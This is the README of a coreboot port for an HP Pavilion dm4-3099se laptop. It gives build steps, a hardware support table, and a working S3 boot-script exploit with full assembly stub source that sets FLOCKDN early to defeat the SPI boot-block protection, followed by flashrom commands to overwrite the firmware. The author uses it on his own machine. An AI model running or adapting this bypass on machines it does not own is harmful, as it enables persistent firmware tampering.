# coreboot on an HP Pavilion dm4-3099se (board 1793)

*[Versión en castellano](README.md)*

So, this is a coreboot port for my old laptop that nobody supports anymore. I always had a
feeling it could be done, since nobody had ever put coreboot on this thing. Plus there's the
exploit I wrote so I could flash it without opening the machine (couldn't be bothered, even
though I've taken that laptop apart a million times).

I'd wanted to do this for ages and did some research here and there, but never got around to
it. So I finally said screw it: I'll flash as far as I can, and if it bricks, well, out comes
the clip lol. I also wondered whether libreboot would run on this old thing, and it ended up
here.

---

## First things first: libreboot doesn't exist for this

Before you ask: **you don't "port to libreboot"**. Libreboot isn't firmware, it's a coreboot
distribution. It takes coreboot, configures it, adds a payload and ships ready-made ROMs for a
short list of boards. You port to **coreboot**, and libreboot decides afterwards whether to
package it. This board isn't on that list and never will be.

And on HP, coreboot only supports the business line (EliteBook, ProBook), because every board
has to be ported by hand. Consumer Pavilions aren't there. The only Pavilion in the whole
coreboot tree is an m6-1035dx, which is AMD on top of that.

So the actual project was: write a port from scratch, and figure out how to flash it.

## What works and what doesn't

Tested on **my** dm4-3099se. It worked for me, keep that in mind.

| | |
|:---|:---|
| Boot | ✅ SeaBIOS → GRUB → Linux / Windows |
| RAM | ✅ native raminit, no MRC blob |
| Video | ✅ libgfxinit, LVDS 1600x900 with backlight |
| Audio | ✅ IDT codec |
| WiFi / Ethernet / USB | ✅ |
| Keyboard / touchpad | ✅ |
| Battery and charger | ✅ |
| Lid | ✅ |
| Fn keys | ✅ volume and keyboard light (the EC handles those itself, they never touch ACPI) |
| CPU temps | ✅ |
| S3 suspend | ⚠️ haven't tested it under coreboot yet |
| Intel ME | ⚠️ still alive, more on that below |

## The specs

(fair warning, this machine is a frankenstein: that CPU shouldn't be supported, and neither
should the RAM it's got, but that's a whole other story lol)

| | |
|:---|:---|
| Board | 1793 (`$BID01793`, it's burned into the firmware) |
| CPU | i7-2630QM, Sandy Bridge |
| PCH | HM67, Cougar Point series 6 |
| Video | Intel HD 3000, LVDS panel |
| SPI flash | Macronix MX25L32xx, 4 MB |
| Stock BIOS | InsydeH2O F.0C, from 2013. Last one HP ever shipped |

## Building it

```bash
git clone https://review.coreboot.org/coreboot.git
cd coreboot
cp -r /path/to/this/repo/src/mainboard/hp/pavilion_dm4 src/mainboard/hp/
make crossgcc-i386 CPUS=$(nproc)
make menuconfig     # Mainboard -> HP -> Pavilion dm4-3000 series
make
```

Use **SeaBIOS** as the payload. If you dual boot Windows on MBR it's the only thing that'll
work, and it boots GRUB without any drama. Turn on `CONSOLE_CBMEM` and `USBDEBUG` too, because
if something blows up those are the only way you'll ever find out where.

---

# The exploit

I'm telling you the whole thing right here. The write-up is for the fine print.

## The problem

HP's firmware protects the flash **boot block** with the SPI controller's `PR0` register.
Specifically the range `0x3a1000-0x3fffff`, which happens to be **exactly** where the reset
vector lives (`0xFFFFFFF0` maps to chip offset `0x3ffff0`).

So: precisely where coreboot needs to put its bootblock. What a coincidence, right.

```
BIOS_CNTL (LPC 0xDC) = 0x00     BIOSWE=0  BLE=0  SMM_BWP=0
HSFS      (+0x04)    = 0xe008   FLOCKDN=1
PR0       (+0x74)    = 0x83ff03a1  -> protects 0x3a1000-0x3fffff
```

You can write 85% of the BIOS region, just not the part that matters. Without getting around
that, either you buy an SPI programmer and crack the machine open, or there's no coreboot.

And check this out: HP's own flasher ships `[ForceFlash] BB_PEI=0` in its `platform.ini`. Their
updater **can't touch the boot block either**. Not that it doesn't want to, it just can't.

## What did NOT work

First thing I tried was the classic S3 boot script attack (Wojtczuk & Kallenberg, 2015). Here's
the idea: when the machine suspends to S3, the firmware saves a table with every operation it
has to replay on wake to restore chipset state. That table lives in ACPI NVS memory, which
**the OS can write to**. So you find the entry that reprograms `PR0` and patch it.

Tested it with zero risk: `rtcwake -m mem`, then read the registers on the way back. `dmesg`
confirmed it was real S3, and `PR0` came back identical. The firmware reapplies it on resume.

Then I mapped the whole table: **903 entries**. 477 `PCI_WRITE`, 247 `MEM_WRITE`,
147 `MEM_READ_WRITE`, 25 `DISPATCH`, 5 `IO_WRITE`.

And the verdict was that **the boot script doesn't write `PR0` or `FLOCKDN`**. Checked all 903.
It touches a pile of RCBA registers and even the SPI VSCC regs, but not the protections.

So there was nothing to patch. The classic attack didn't apply.

## What DID work

But mapping the table paid off anyway. Of those 25 `DISPATCH` entries (the opcode that jumps to
code at a physical address stored **in the table itself**), 24 all pointed to the same place:
`0xACEBC260`. Which turned out to be DRAM marked `Reserved`, meaning writable from the OS, with
actual 32-bit x86 code sitting in it:

```asm
0xACEBC260:  ff 74 24 08     push dword [esp+8]
             ff 74 24 08     push dword [esp+8]
             e8 1e 11 00 00  call ...
             59 59           pop ecx / pop ecx
             e9 bc 01 00 00  jmp  ...
```

(number 25 pointed at `0xFFFAF998`, inside the protected boot block, didn't touch that one)

That's **arbitrary code execution in the firmware's resume context**. Question was whether it
bought me anything, and that hinged on something I didn't know: when does the firmware apply the
protections, before or after running the boot script?

So I measured it instead of guessing. I repointed the first and last `DISPATCH` entries at my
own 45-byte stubs that read `HSFS` and `PR0`, dump the value to memory, and jump to the original
routine so the resume doesn't break.

| | first DISPATCH | last DISPATCH | normal runtime |
|:---|:---|:---|:---|
| `HSFS` | `0x6008` | `0x6008` | `0xe008` |
| `PR0` | `0x00000000` | `0x00000000` | `0x83ff03a1` |

`0x6008` has bit 15 (`FLOCKDN`) **clear**. There it is: **the firmware applies the protections
AFTER the boot script finishes.** Which means there's a window where everything is wide open and
I get to run code inside it.

Now, clearing `PR0` from in there is useless, because the firmware rewrites it at the end. But
`FLOCKDN` is a **write-once** bit: once you set it to 1, the `PR` registers are frozen until the
next reset, **no matter who tries to write them afterwards**.

So here's what I do: **I slam the lock shut first, while the registers are still empty.**

```asm
    push eax
    push edx
    mov  edx, 0xFED1F874        ; PR0
    mov  eax, [edx]
    mov  [RES+0], eax           ; save PR0 before, as evidence
    mov  edx, 0xFED1F804        ; HSFS
    mov  ax,  0x8000            ; FLOCKDN
    mov  [edx], ax              ; <<< lock slams here
    movzx eax, word [edx]
    mov  [RES+4], eax
    mov  edx, 0xFED1F874
    mov  eax, [edx]
    mov  [RES+8], eax           ; and PR0 after
    mov  dword [RES+12], 0xC0FFEE03
    pop  edx
    pop  eax
    push 0xACEBC260             ; jump to the original routine
    ret
```

64 bytes, hung off the last `DISPATCH` entry's pointer. One `rtcwake -m mem -s 20` and that's
it. When the firmware goes to write `PR0`, its write quietly goes nowhere.

```
before suspend: HSFS = 0xe008   PR0 = 0x83ff03a1
after resume:   HSFS = 0xe008   PR0 = 0x00000000
```

And flashrom confirmed it on its own: the `PR0: Warning ... read-only` disappeared and the whole
BIOS region started showing up as `read-write`. **Boot block freed, without touching a single
screw.**

One detail that matters: the exploit **does not overwrite** the routine at `0xACEBC260`. It gets
called 24 times and if you break it the entire resume goes to hell. I only repoint **one** entry,
and my stub jumps to the original when it's done.

## Is this new? Nah

Not gonna oversell it: the bug class is from 2015, and back then it produced advisories from
CERT/CC and several vendors. What I've got here is one specific case, measured and unpatched,
with a PoC that actually works. That's it.

CVE odds are low. The product's been dead for years, the class is documented, and you're
starting from ring 0 anyway.

What *could* be juicy is checking whether the same pattern shows up across the whole HP consumer
line running InsydeH2O from that era. Then it stops being "one old laptop" and becomes a platform
bug that hit a ton of machines. But I didn't verify that, I've got one machine lol. Or do I :P?

---

## Flashing

```bash
sudo python3 tools/exploit_auto.py     # drops the stub into the boot script
sudo rtcwake -m mem -s 20              # suspend and wake: this is where it fires
sudo python3 tools/spi_check.py        # PR0 should read 0x00000000

sudo flashrom -p internal:laptop=force_I_want_a_brick \
              --ifd -i bios --noverify-all -w build/coreboot.rom
```

Three things that cost me time, so they don't cost you any:

**Don't pass `-c <chip>` to flashrom.** The `FLOCKDN` we slam shut early also freezes the SPI
opcode menu, so flashrom falls back to hardware sequencing, can't do `RDID` and ends up using an
"Opaque flash chip". Force the model and it'll throw `No EEPROM/flash device found` and write
nothing.

**`--noverify-all` is not optional.** Without it flashrom wants to read the entire chip before
writing, ME region included, which is unreadable, and it dies with `Transaction error`.

**The effect lives in RAM.** Every cold boot rebuilds the boot script, so if you're going to
flash again you have to redo the suspend/resume.

And now the good news: **once coreboot boots, you never need the exploit again.** coreboot uses
`BOOTMEDIA_LOCK_NONE` and doesn't program the PR registers, so the flash stays open forever.
Reflashing becomes one command and you're done.

### Back it up first, don't get ahead of yourself

```bash
sudo flashrom -p internal:laptop=force_I_want_a_brick \
              --ifd -i bios -r backup_bios_region.bin
```

Keep it on **another** machine, not the one you're flashing. If something goes sideways and it
won't POST, that file plus a SOIC-8 clip get your original firmware back.

## The Intel ME

Still alive. coreboot doesn't touch it, just leaves it where it is.

And **you can't disable it in software on this board**. That's not coreboot's fault, it's the
hardware: the flash descriptor denies the host both read *and* write on the ME region. You can't
even read it to feed `me_cleaner`. Straight from `ifdtool` on my own descriptor:

```
FLMSTR1: 0x0a0b0000 (Host CPU/BIOS)
  Intel ME Region Read Access:       disabled
  Intel ME Region Write Access:      disabled
  Flash Descriptor Write Access:     disabled
```

Those permissions get repopulated by the chipset from the descriptor on **every boot**, and the
descriptor itself is read-only to the host. Not the exploit, not coreboot, nothing running on
the CPU can change them.

For that you need an external SPI programmer, no way around it. And if you're going to do it,
do both things in one go: run `me_cleaner` **and** write an unlocked descriptor. After that
everything is software-flashable forever, ME included. One session with the clip and you never
need it again.

## The tools

| | |
|:---|:---|
| `tools/exploit_auto.py` | finds the S3 boot script and installs the `FLOCKDN` exploit. Locates everything itself, no hardcoded addresses |
| `tools/spi_check.py` | shows you the SPI protections: `BIOS_CNTL`, `HSFS`, `FRAP`, `PR0-4` and the flash layout |
| `tools/bs2.py` | parses the S3 boot script |
| `tools/spd_probe.py` | finds the SPD addresses on the SMBus without making you install `i2c-tools` |

## The write-ups

Both are in `docs/`, in Spanish. If you're porting another board they're worth running through
a translator.

**[`WRITEUP_completo_coreboot_dm4.md`](docs/WRITEUP_completo_coreboot_dm4.md)** covers the whole
thing: recon, the encrypted SoftPaq that went nowhere (entropy 7.9995, swept 8 binaries × 9
ciphers and got nothing), the flash map, how the exploit came together, the port with the six
fixes I had to do by hand, and the three flashing attempts before one stuck.

**[`WRITEUP_s3_bootscript_pr0_bypass.md`](docs/WRITEUP_s3_bootscript_pr0_bypass.md)** is the
exploit in detail, with commented shellcode, evidence and mitigations.

That's where the stuff no tool will ever tell you lives. Two that made me want to throw the
laptop out the window:

- `autoport` leaves the panel configured as **eDP** when this machine's is **LVDS**. With that
  the screen doesn't come on and you have no idea why. It's missing a
  `select GFX_GMA_PANEL_1_ON_LVDS` that neither the X220 nor the Dell Latitude skip, but
  autoport doesn't generate.
- The **`LGMR`** register (LPC cfg `0x98`) opens the decode for the EC window at `0xFE802000`,
  which is where the battery data comes from. HP programmed it, coreboot doesn't, and **it shows
  up in no autoport log whatsoever**: not `inteltool`, not `lspci`, not `acpidump`. Without it
  the battery reads as absent and the ASL looks broken when it's actually fine.

## Heads up

Messing with firmware can turn your machine into a paperweight. I'm not responsible if your
fucking machine dies. This is tested on **my** machine and it worked for me, but I have *this*
dm4-3099se. If yours is a different dm4-3000 variant, at the very least check the SPD map and
the panel timings before flashing, both are documented in the write-up.

And keep a SOIC-8 clip around. Not to flash with, but so you can try to bring it back when you
screw up lol.

## License

GPL-2.0-only, same as coreboot.

The battery ASL in `acpi/ec.asl` comes from the stock HP firmware's DSDT, and `data.vbt` is the
Video BIOS Table pulled off the same machine. They're bundled because the hardware doesn't work
without them, which is what every coreboot port does anyway.

---

*By cl45h, Aguante RemoteExecution, siempre <3*
